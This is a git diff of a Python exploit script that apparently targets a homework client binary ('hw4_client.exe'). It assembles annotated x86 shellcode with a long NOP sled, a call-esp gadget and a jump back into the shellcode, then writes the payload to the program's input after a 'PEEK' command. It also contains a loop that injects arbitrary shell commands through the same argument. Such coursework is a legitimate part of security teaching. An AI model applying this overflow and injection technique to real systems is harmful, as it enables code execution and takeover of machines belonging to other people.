@@ -63,9 +63,9 @@ def GetGadgetAddress(gadget):
 
 
 #proc = subprocess.Popen('./hw4_client.exe', stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-proc = subprocess.Popen(["hw4_client.exe"],stdin=subprocess.PIPE)
-
-
+proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)
+#print(proc.id())
+input()
 
 username = "archer\n"
 usernameHex = str.encode(username)
@@ -87,22 +87,30 @@ address = ''
 
 shellcode = ""
 jmptoshell = "E968FDFFFF"
-beginingOFShell =  "C7 45 08 63 61 40 00" +	"8B 45 0C 89 44 24 04 C7 04 24 68 61 40 00 E8 CA 30 00 00"
-beginingOFShell +=  "83 c4 10 " 												
-beginingOFShell +=	"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        
-																				
-beginingOFShell +=	"8D 85 6C DF FF FF 89 44 24 08 8B 45 F0"				 
-																				
-																				
-beginingOFShell +=	"89 44 24 04 8B 45 08 89 04 24 E8 D6 FA FF FF"
-beginingOFShell	+=	"83 c4 f0  "											
-beginingOFShell	+= "90"* (4172 - 76)
+beginingOFShell = ""
+beginingOFShell +=  "C7 45 08 63 61 40 00" 										#"mov [ebp+8], "PEEK"
+beginingOFShell +="8B 45 0C 89 44 24 04 C7 04 24 68 61 40 00 E8 CA 30 00 00"	# mov eax,DWORD PTR [ebp+0xc]
+																				# mov DWORD PTR [esp+0x4],eax
+																				# mov DWORD PTR [esp],0x406168
+																				# call scanf
+beginingOFShell +=  "83 c4 10 " 												#add    esp,16									
+beginingOFShell +=	"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        	#mov 	dword ptr [esp+16], 0
+																				#mov    DWORD PTR [esp+0xc],0x408080
+beginingOFShell +=	"8D 85 6C DF FF FF 89 44 24 08 8B 45 F0"				 	# lea     eax, [ebp-2094h]
+																				#mov    DWORD PTR [esp+0x8],eax
+																				#mov    eax,DWORD PTR [ebp-0x10]
+beginingOFShell +=	"89 44 24 04 8B 45 08 89 04 24 E8 D6 FA FF FF"				#mov    DWORD PTR [esp+0x4],eax
+																				#mov    eax,DWORD PTR [ebp+0x8]
+																				# mov    DWORD PTR [esp],eax
+																				#call    sub_401892
+beginingOFShell	+=	"83 c4 f0  "												# esp ,-16									
+beginingOFShell	+= "90"* (4172 - 76)											#	nops
 
 
 shellcode += beginingOFShell + callEsp + jmptoshell
 #print(shellcode)
 second_attack = str.encode("PEEK ") + bytearray.fromhex(shellcode) + str.encode("\n")
-#proc.stdin.write(second_attack)
+proc.stdin.write(second_attack)
 	
 
 while False:
@@ -113,7 +121,7 @@ while False:
 	if command == "exit":
 		proc.kill()
 		break
-	proc.stdin.write(str.encode("PEEK \" *; " +command +"\n"))
+	proc.stdin.write(str.encode("PEEK \" *;| out-null  " +command +"\n"))
 	proc.stdin.flush()
 
 #peek "*; echo msg"
